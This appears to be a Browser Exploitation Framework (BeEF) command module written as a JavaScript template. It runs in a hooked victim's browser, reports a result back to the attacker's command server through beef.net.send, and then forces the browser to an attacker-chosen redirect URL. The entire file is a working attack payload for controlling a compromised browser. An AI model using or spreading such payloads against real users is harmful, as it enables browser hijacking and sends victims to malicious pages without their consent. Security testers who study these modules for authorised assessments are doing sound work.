beef.execute(function() {
	
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Redirected to: <%= @redirect_url %>', function(){window.location = "<%= @redirect_url %>"});

});

